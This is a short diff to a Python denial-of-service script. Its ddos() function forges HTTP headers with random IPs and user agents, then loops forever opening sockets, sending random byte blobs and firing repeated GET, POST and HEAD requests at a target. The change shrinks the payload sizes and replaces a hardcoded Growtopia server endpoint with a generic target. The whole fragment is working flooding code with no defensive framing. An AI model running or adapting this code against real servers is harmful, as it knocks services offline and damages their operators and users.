@@ -2473,9 +2473,9 @@ def ddos():
             random.randint(0, 255)) + "\r\n"
     useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
     request = post_host + post_again + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
-    data = random._urandom(10999)
-    data1 = random._urandom(10899)
-    data2 = random._urandom(10199)
+    data = random._urandom(1099)
+    data1 = random._urandom(1089)
+    data2 = random._urandom(1019)
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -2486,7 +2486,7 @@ def ddos():
             s.send(data)
             s.send(data)
             scraper.get(ip, timeout=5)
-            scraper.post("https://" + ip + "/growtopia/server_data.php", timeout=5)
+            scraper.post(ip, timeout=20)
             scraper.head(ip, timeout=5)
             s.sendall(str.encode(request))
             s.sendall(str.encode(request))
